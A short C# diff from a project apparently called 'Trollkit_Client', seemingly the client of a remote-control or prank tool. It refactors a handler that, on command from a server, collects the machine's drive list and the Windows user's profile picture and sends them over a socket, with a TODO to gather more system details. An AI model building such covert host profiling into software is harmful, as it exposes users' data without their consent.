@@ -18,18 +18,27 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			switch (obj.Command)
 			{
 				case "GetClientInfo":
-					string drives = getSysInfo();
-
-
-					TransferCommandObject drivesTransferObject = new TransferCommandObject { Command = "Drives", Handler = "SystemInfo", Value = drives};
-					SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(drivesTransferObject));
+					CollectAndReturnSystemInfo(s);
 					return true;
 			}
 
 			return false;
         }
 
-        private string getSysInfo()
+		private void CollectAndReturnSystemInfo(Socket s)
+		{
+			string drives = GetSystemDrives();
+			TransferCommandObject drivesTransferObject = new TransferCommandObject { Command = "Drives", Value = drives };
+			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(drivesTransferObject));
+
+			//TODO: cpu, ram??, windows version, network, peripherals
+			string base64ProfilePicture = WindowsProfilePicture.Get448ImageString();
+			TransferCommandObject pfTransferObject = new TransferCommandObject { Command = "ProfilePicture", Value = base64ProfilePicture };
+			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(pfTransferObject));
+		}
+
+
+        private string GetSystemDrives()
         {
             string returnString = "Available Drives: ";
             var drives = DriveInfo.GetDrives();
